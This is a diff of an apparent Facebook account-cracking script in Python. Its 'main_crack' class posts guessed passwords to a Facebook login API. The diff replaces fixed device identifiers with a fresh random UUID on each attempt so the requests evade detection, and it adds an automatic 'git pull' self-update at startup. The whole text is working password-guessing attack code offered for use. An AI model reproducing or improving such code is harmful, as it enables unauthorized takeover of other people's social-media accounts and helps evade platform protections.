@@ -31,7 +31,6 @@ def update_script():
 
     except Exception as e:
         print(f"❌ Update failed! {e}")
-        sys.exit(1)
 
 
 os.system('clear')
@@ -153,6 +152,7 @@ def linex(): print(f'{white}━━━━━━━━━━━━━━━━━�
 
 
 # __________________[ SYS ]__________________#
+os.system('git pull')
 sys.stdout.write('\x1b]2; xbow \x07')
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
         'viewport-width': '980'}
@@ -374,7 +374,7 @@ class main_crack():
             time.sleep(1)
             main_crack().crack(id)
 
-    def methodA(self, sid, name, psw, uuid):
+    def methodA(self, sid, name, psw):
         try:
             global oks, cps, loop
             sys.stdout.write(
@@ -390,9 +390,9 @@ class main_crack():
                                                                                                               ls).replace(
                     'Name', name).replace('name', name.lower())
                 with requests.Session() as session:
-                    data = {"adid": uuid,
+                    data = {"adid": str(uuid.uuid4()),
                             "format": "json",
-                            "device_id": uuid,
+                            "device_id": str(uuid.uuid4()),
                             "email": sid,
                             "password": ps,
                             "generate_analytics_claim": "1",
@@ -400,7 +400,7 @@ class main_crack():
                             "linked_guest_account_userid": "",
                             "cpl": "true",
                             "try_num": "1",
-                            "family_device_id": uuid,
+                            "family_device_id": str(uuid.uuid4()),
                             "secure_family_device_id": "95ea3bfe-07d8-4863-a520-4dbe79704e04",
                             "sim_serials": '["89014103211118510720"]',
                             "credentials_type": "password",
@@ -417,7 +417,7 @@ class main_crack():
                             "machine_id": "EvuAZ37kNVMnKcUo51EIB9uP",
                             "jazoest": "22610",
                             "meta_inf_fbmeta": "V2_UNTAGGED",
-                            "advertiser_id": uuid,
+                            "advertiser_id": str(uuid.uuid4()),
                             "encrypted_msisdn": "",
                             "currently_logged_in_userid": "0",
                             "locale": "en_GB",
